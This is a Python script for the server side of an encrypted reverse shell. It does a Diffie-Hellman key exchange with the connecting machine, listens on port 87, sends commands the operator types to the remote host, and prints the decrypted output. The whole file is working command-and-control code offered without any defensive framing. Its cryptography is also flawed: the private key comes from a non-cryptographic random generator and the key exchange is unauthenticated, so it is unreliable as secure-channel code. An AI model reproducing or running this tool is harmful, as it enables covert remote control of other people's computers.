import socket


# AES and DH

from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Hash import SHA256
from Crypto.Util.Padding import pad, unpad
from Crypto.PublicKey import RSA
import random

PRIME = 2**2048 - 159
GENERATOR = 2

class DiffieHellmanChannel:
    def __init__(self):
        self.private = random.randint(2, PRIME - 2)
        self.public = pow(GENERATOR, self.private, PRIME)
        self.shared_key = None

    def generate_shared_key(self, other_public):
        shared_secret = pow(other_public, self.private, PRIME)
        sha = SHA256.new()
        sha.update(str(shared_secret).encode())
        self.shared_key = sha.digest()[:16]

    def encrypt(self, message):
        if isinstance(message, str):
            message_bytes = message.encode()
        elif isinstance(message, bytes):
            message_bytes = message
        else:
            raise TypeError("Message must be a string or bytes")

        padded_message = pad(message_bytes, AES.block_size)
        iv = get_random_bytes(AES.block_size)

        cipher = AES.new(self.shared_key, AES.MODE_CBC, iv)
        encrypted_message = cipher.encrypt(padded_message)
        return iv + encrypted_message  # Return the IV concatenated with the encrypted message


    def decrypt(self, encrypted_message):
        if not encrypted_message:
            raise ValueError("Empty message received")
        if len(encrypted_message) < AES.block_size * 2:
            raise ValueError(f"Encrypted message is too short ({len(encrypted_message)} bytes). IV or ciphertext might be missing.")

        iv = encrypted_message[:AES.block_size]
        ciphertext = encrypted_message[AES.block_size:]

        cipher = AES.new(self.shared_key, AES.MODE_CBC, iv)
        decrypted_message = unpad(cipher.decrypt(ciphertext), AES.block_size)
        return decrypted_message.decode(errors="ignore")

#Script

host = '0.0.0.0'
port = 87

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

server.bind((host, port))

server.listen(1)
print(f"[+] Listening on {host}:{port}...")

conn, addr = server.accept()
print(f"[+] Connection from {addr[0]}:{addr[1]}")

secure = DiffieHellmanChannel()
conn.send(str(secure.public).encode())
client_pub = int(conn.recv(4096).decode())
secure.generate_shared_key(client_pub)

try:
    while True:
        conn.send(secure.encrypt("Hello!"))
        cwd = conn.recv(1024)
        cwd = secure.decrypt(cwd).strip()

        command = input(f"{cwd}> ")

        while not command.strip():
            command = input(f"{cwd}> ")

        conn.send(secure.encrypt(command))

        if command.lower() == "exit":
            break

        data = ""

        EOF_MARKER = "<EOF>"
        while True:
            chunk = conn.recv(4096)
            decrypted = secure.decrypt(chunk)
            data += decrypted
            
            eof_pos = data.find(EOF_MARKER)
            if eof_pos != -1:
                output = data[:eof_pos]
                print(output)
                break

finally:
    conn.close()
    server.close()
